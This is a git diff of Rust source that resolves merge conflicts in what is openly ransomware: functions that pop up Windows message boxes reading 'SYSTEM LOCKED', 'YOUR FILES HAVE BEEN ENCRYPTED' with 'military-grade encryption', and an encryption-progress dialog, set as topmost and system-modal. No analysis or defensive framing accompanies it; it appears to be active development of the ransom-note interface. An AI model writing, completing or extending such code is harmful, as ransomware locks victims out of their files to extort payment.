@@ -4,10 +4,7 @@
 #[cfg(target_os = "windows")]
 pub fn show_ransom_dialog(correct_key: &str) -> Result<(), String> {
     use std::ptr;
-<<<<<<< HEAD
     use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, MB_TOPMOST};
-=======
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     // Mostrar primer mensaje de advertencia
     let title = wide_string(" SYSTEM LOCKED");
@@ -140,14 +137,9 @@ Contact: EMAIL
 #[cfg(target_os = "windows")]
 pub fn show_encryption_complete_dialog(key_hint: &str) -> Result<(), String> {
     use std::ptr;
-<<<<<<< HEAD
     use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_OK, MB_TOPMOST};
 
     let title = wide_string("🔒 ENCRYPTION COMPLETE");
-=======
-
-    let title = wide_string(" ENCRYPTION COMPLETE");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let message_text = format!(
         "  YOUR FILES HAVE BEEN ENCRYPTED  \n\n\
          {} files have been encrypted with military-grade encryption.\n\n\
@@ -177,14 +169,9 @@ pub fn show_encryption_complete_dialog(key_hint: &str) -> Result<(), String> {
 #[cfg(target_os = "windows")]
 pub fn show_encryption_progress_dialog(files_count: usize) -> Result<(), String> {
     use std::ptr;
-<<<<<<< HEAD
     use winapi::um::winuser::{MessageBoxW, MB_ICONINFORMATION, MB_OK, MB_TOPMOST};
 
     let title = wide_string("🔄 Encryption in Progress");
-=======
-
-    let title = wide_string(" Encryption in Progress");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     let message_text = format!(
         "Please wait...\n\n\
          Processing {} files\n\
